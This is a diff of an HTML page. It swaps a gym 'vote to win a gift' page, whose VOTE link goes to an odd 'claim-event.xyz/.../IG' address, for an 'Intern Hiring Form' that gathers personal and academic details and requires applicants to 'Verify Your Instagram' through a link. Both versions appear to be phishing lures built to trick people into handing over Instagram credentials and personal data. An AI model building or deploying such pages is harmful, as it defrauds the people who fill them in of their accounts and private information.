@@ -3,28 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voting Page</title>
-    <link rel="stylesheet" href="my.css">
+    <link rel="stylesheet" href="style.css">
+    <title>Intern Hiring Form</title>
 </head>
+
 <body>
+    <header>
+        <h1>
+            <i>!! HEIRING FOR SOCIAL MEDIA HANDELING !!</i>
+        </h1>
+        <h4>"Join us as Social Media Manager! Create engaging content, manage communities,</h4>
+        <h4> and boost brand presence. Embrace creativity and drive digital impact. "</h4>
+    </header>
 
     <div class="container">
-        <h1>POWERED BY FITNESS ERA</h1>
-        <h4> 50% OFF OFFER</h4>
+        
+        <h2>Apply Here</h2>
+        <form id="internForm">
+            <label for="fullName">Full Name (required):</label>
+            <input type="text" id="fullName" name="fullName" required>
 
-           <h4> 📍near Shani mandir, Ganga sagar , garha road , Madan mahal , Jabalpur (M.P)
-            </h4>
-        <h2>Vote for Your Favorite gym Candidate For geting her to get exiting gift </h2>
-        <div id="candidates">
-            <label for="candidate1">
-                <input type="radio" id="candidate1" name="candidate" value="Candidate 1"> sonam
-            </label>
-            <label for="candidate2">
-                <input type="radio" id="candidate2" name="candidate" value="Candidate 2"> rishika
-            </label>
-        </div>
-        <a href="https://claim-event.xyz/HOME/IG?id=1717075100">VOTE</a>
-        <p id="result"></p>
+            <label for="email">Email (required):</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="fullName">Write Your College Name (required)</label>
+            <input type="address" id="address" name="address" required>
+
+            <label for="fullName">Write Your CGPA (required)</label>
+            <input type="number" id="percentage" name="percentage" required>
+
+            <label for="fullName">Discreption About You (optional):</label>
+            <input type="text" id="discreption" name="discreption" required>
+
+            <label for="fullName">Completion Of Your degree :</label>
+            <input type="date" id="date" name="date" required>
+
+            <label for="resume">Resume (optional):</label>
+            <input type="file" id="resume" name="resume" accept=".pdf,.doc,.docx" >
+
+            <label for="instagramUsername">Verify Your Instagram Here (required):</label>
+            
+            <div class="rerun"><a href="">Please Verify</a></div>
+            
+
+            <button type="submit">Submit</button>
+        </form>
     </div>
 
     <script src="script.js"></script>
